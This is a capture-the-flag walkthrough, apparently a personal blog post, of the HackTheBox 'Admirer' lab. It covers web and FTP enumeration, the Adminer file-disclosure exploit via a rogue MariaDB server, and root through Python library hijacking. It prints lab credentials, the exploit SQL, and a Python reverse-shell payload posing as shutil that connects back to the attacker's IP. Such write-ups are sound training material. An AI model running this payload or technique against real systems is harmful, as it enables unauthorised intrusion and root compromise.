---

title: HackTheBox - Admirer
layout: post
date: 2020-09-26 23:00:00 +0800

---

![826c1493afa78679ff83dafffcebe67c.png](/images/htb-admirer/5464a822f9024db2938987e1005cfb31.png)

### 0. Preface

This box is pretty frustrating due to the amount of rabbit holes I got stuck in, but at least I learnt something new from this. Moral of the story - don't always rely on one tool or wordlist.

In this box, we will be tackling: 

1. Getting stuck in rabbit holes.
2. Exploiting Adminer
3. Hijacking Python libraries

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -oN nmap.txt 10.10.10.187 -v
```

![0c73a005283aa29f1468fde5c927a02c.png](/images/htb-admirer/6d7bdba885b34b09b30c214e8862c400.png)

Only ports 21, 22 and 80 are open. Let's first check out the web server. 

### 2. Web Server Enumeration #1

![175f7c95a982b4f1650ff2212869918a.png](/images/htb-admirer/d04c31d4d5224023b1a6004e68c3cadb.png)

Seems like a gallery. Let's see what we can enumerate from this. 

![249a5fc0ae0490bcbd17f0a5ea0f0898.png](/images/htb-admirer/4494c870868b474b89fb66ade3c11747.png)

Looking in the `robots.txt` file, we see that there is an entry to disallow robots from crawling `/admin-dir/`.

Trying to access the page gives us a 403, so let's run `gobuster` on it. Notice from `robots.txt` that this folder contains "personal contacts and creds". Let's use `gobuster` on `/admin-dir/`, with the `.txt` extension to also look for text files.

![65746ae59bba5d1fada1d39630489c4a.png](/images/htb-admirer/333156a815ce4d93952d17fd36d2464f.png)

```bash
gobuster dir -u admirer.htb/admin-dir/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt
```

![882d265f1964209d4246cea1f9cc93a2.png](/images/htb-admirer/2b6907bb99c34e12a2c718fb29007ed0.png)

And we found something. Let's take a look at those files. 

![be612d26774ece30bcec54715e800f12.png](/images/htb-admirer/d8cf2eeeedc5443f857339b1dc30d069.png)

![9413ba376e9d66c9a6ea7d4591887397.png](/images/htb-admirer/8b782a96cde14842815c5762b0c04db6.png)

Seems like we got credentials to FTP, using `ftpuser:%n?4Wz}R$tTF7`. 

### 3. FTP Enumeration

Logging into the FTP server, we see two files in there. Let's download both of them. 

![0f6969d79428ec39a1d837dce6b97f30.png](/images/htb-admirer/020f6affb8dd434bbc0558d8dda7d3d7.png)


(🐇) We don't really get much using `strings` on `dump.sql`. Moving on to the `html.tar.gz`. 

![d5e4172b07020ae8470ed6b56929eed5.png](/images/htb-admirer/ef4db8defa784ed28c25df5da54dbd9c.png)

```bash
7z x html.tar.gz
7z x html.tar
```

![773f9403f1050d43b12add9fa507aae3.png](/images/htb-admirer/5bedebdcf8654396aa208e8caa71579f.png)

Let's do some more enumeration on the files inside. There's tons to go through.

(*kinda* 🐇) Looking in `index.php` we get what looks like database credentials to a mysql database. 

![7afd94a452ac8d03fa3d349ce3f12e70.png](/images/htb-admirer/f3ea2f8a47344aaaa49b1bf5bb3a15b1.png)

(🐇) Looking in `/w4ld0s_s3cr3t_d1r/credentials.txt`, we get another bunch of credentials. Looks similar to the `credentials.txt` we found on the server earlier. 

![5bcb45a8bbb945fe653374339cc69f41.png](/images/htb-admirer/0dfa4e4397944d3aa33bb9126f410e78.png)

(*kinda* 🐇) Looking in `/utility-scripts/db_admin.php`, we get more database credentials and a note that says to find a "better open source alternative". 

![991a3a3f90a239d251a58c066162a46d.png](/images/htb-admirer/be9f66b08a3a42108483f6ae91c699fa.png)

### 4. Web Server Enumeration #2

(🐇) Let's next try to access the `utility-scripts` directory on the web server to see if it exists. 

![ff098b69634ee032366c4ab134b152b3.png](/images/htb-admirer/425851a481484d338033f68875388ddf.png)

(🐇) Then, try to access `info.php`. We get `phpinfo()`. From here, we can see that the webserver is running Apache2, PHP 7.0.33. 

![e9067ed953282d1bf11a1782c439bf91.png](/images/htb-admirer/3cb2e050dc95415aade5020d0c7651e4.png)

(🐇) Moving on to `admin_tasks.php`, we get something that allows us to run remote scripts on the server. (🐇🐇🐇🐇🐇🐇🐇🐇)

![bb392372326e7c97b569ad2f7a63bda1.png](/images/htb-admirer/c98a9236e04a4d6c8c1c1e712616dfb6.png)

*Stuck at this point, I even tried to SSH to the server using the `ftpuser` credentials we found earlier.*

![c02fd49c810393357cf9779b027ede6e.png](/images/htb-admirer/a0fe38d6169f4fd5b06397d2728be63e.png)

*After a lot of hints from the HTB forums I found  Adminer running on the server.*

![36cc0d6a5e0599c8b7ef8873714d2d0d.png](/images/htb-admirer/6e1782bb96054285ac166471bb9ad143.png)

### 5. Exploiting Adminer

Googling for Adminer netted us [an exploit](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). This allows us to read files on the server where Adminer is installed. Let's set up the exploit.

We need a MariaDB/MySQL instance for this to work. Fortunately, MariaDB already comes preinstalled on Kali. Spin it up using `systemctl start mariadb`, then `sudo mariadb` or `sudo mysql` to access it. 

*Note: I had to reinstall MariaDB entirely because it wasn't starting up at all.*

![78535cd339c9f2460f82a2d71470c812.png](/images/htb-admirer/1689b7b826334245b3d37111dfa2e9af.png)

Inside the database, create a new user that is allowed to login from anywhere and grant it privileges to access everything. 

```sql
CREATE USER 'kali'@'%' IDENTIFIED BY '<PASSWORD>';
GRANT ALL PRIVILEGES ON * . * TO 'kali'@'%';
FLUSH PRIVILEGES;
```

Next, we need to allow external connections to our MariaDB instance. By default, MariaDB only listens on `127.0.0.1:3306`. 

Open `/etc/mysql/mariadb.conf.d/50-server.cnf` with a text editor, then change the `bind-address` value to `0.0.0.0`. 

![03ba56ea447cca5e0e6d914c716766c3.png](/images/htb-admirer/5b591202a8cf46d5806070c93f4ced62.png)

Restart MariaDB using `sudo systemctl restart mariadb`, then check that server is listening on `0.0.0.0:3306` using `netstat -antp | grep 3306`

![6282a4a00349263a0a11d05187791dde.png](/images/htb-admirer/3e931f6c7bea43c49a73264e08bc0e0b.png)

Back to Adminer, login to Kali's MariaDB server using the user created earlier. 

![4014a9e95c368789b7b30520a6183e85.png](/images/htb-admirer/cb8552a418c24b4184859571dd244b43.png)

![b28979238c7997d1fc70e51cb79b256e.png](/images/htb-admirer/fde617c72dfb4b26b7a3eb12f6534e48.png)

Next, create a new database. 

![5849876bccc0e3c541c2ad54c10f0029.png](/images/htb-admirer/ea6fb38ee2c1464d8646de9405f1455d.png)

Recall previously in the FTP directory that we found the `index.php` file with a MySQL username and password? 

Let's try to read the live version of that file. 

First, we need to start a Wireshark session capturing on the HTB VPN tunnel. 

Then back on Adminer, run the following commands to try to insert `index.php` into the database we created. 

```sql
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE testdb.test
FIELDS TERMINATED BY "\n"
```

Once done, we see some traffic on WireShark from the remote server. We follow each TCP stream until we find the TCP stream for `index.php`. 

![906b463bfaf568f07273a14f9efa5b0b.png](/images/htb-admirer/f29c11d0959e4334afedc3f42abb8c8b.png)

We got our next set of credentials: `waldo:&<h5b~yK3F#{PaPB&dA}{H>`

Let's SSH to the server and grab the user flag. 

![44b68d50812f929738f127c0c9ae2621.png](/images/htb-admirer/a9e0d315772f4c178d9f67ee836f6b12.png)

### 6. Python Library Hijacking and Root

Now, let's start to enumerate. Running `sudo -l`, we see that `waldo` is able to set environment variables while running `/opt/scripts/admin_tasks.sh` as the root user.

![e5241f7da501d64ed3836308fee65ae6.png](/images/htb-admirer/913750a3b3404799952f48a51d3b08c9.png)

Looking at the `admin_tasks.sh` script, we see that it calls for a `backup.py` script in the same directory. 

![97964aa0fdf4f7a556aaa9ec36aa957a.png](/images/htb-admirer/210c058afe484a88a36054ee916580f0.png)

Let's take a closer look at `backup.py`.

![2f60018b108eefde56fc07ba304ddf57.png](/images/htb-admirer/4e3ae80f3f0d4a10a2193ed5ae8337fd.png)

After a bit of searching, I managed to find [this blog post](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) explaining Python library hijacking, as well as [this Medium article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) (*specifically Scenario 3*) explaining how to do it in more detail. 

To exploit this, we need to create a script named `shutil.py` in a directory, and set the `$PYTHONPATH` environment variable to point to this directory instead of the real Python directory. 

Our script will look like this: 

```python
#!/usr/bin/python3

import os
import pty
import socket

lhost = "10.10.14.43"
lport = 8888

def make_archive(a,b,c):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
        s.close()
```

To roughly break down how this works: 
1. `backup.py` will import a function called `make_archive()` from a python module named `shutil`. 
2. As the `make_archive()` in `backup.py` requires three arguments, our `make_archive()` will also need to have three (dummy) arguments. 
3. Once `backup.py` calls for the `make_archive()` function and is redirected here, a reverse shell will run connecting back to our Kali machine. 

*Do remember to replace the `lhost` and `lport` with the correct IP addresses/port number for the reverse shell.*

Now, we can set the `$PYTHONPATH` environment variable to point to `waldo`'s home directory, and run `admin_tasks.sh`. Select option 6 to run the `backup.py` script. 

```bash
sudo PYTHONPATH=/home/waldo/ /opt/scripts/admin_tasks.sh
```

![93f3b2b2027bf67e810888389487404e.png](/images/htb-admirer/4cedc62a8243495aae2265d00d46096f.png)

And we got root.